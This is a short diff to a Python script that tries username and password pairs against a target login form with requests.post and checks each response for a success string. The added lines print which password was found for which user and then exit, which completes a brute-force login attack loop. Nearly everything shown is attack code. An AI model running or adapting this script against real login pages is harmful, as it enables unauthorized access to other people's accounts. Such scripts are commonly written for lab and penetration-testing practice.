@@ -14,5 +14,9 @@ for username in usernames:
             sys.stdout.flush() #flush buffer
             r = requests.post(target, data={"username":username, "password":password})
             if needle.encode() in r.content:
-                
+                sys.stdout.write("\t[>>>>>] Pass '{}' found for user '{}'!".format(password.decode(),username))
+                sys.exit()
+            sys.stdout.flush()
+            sys.stdout.write("\n")
+            sys.stdout.write("\tNo password found")
 
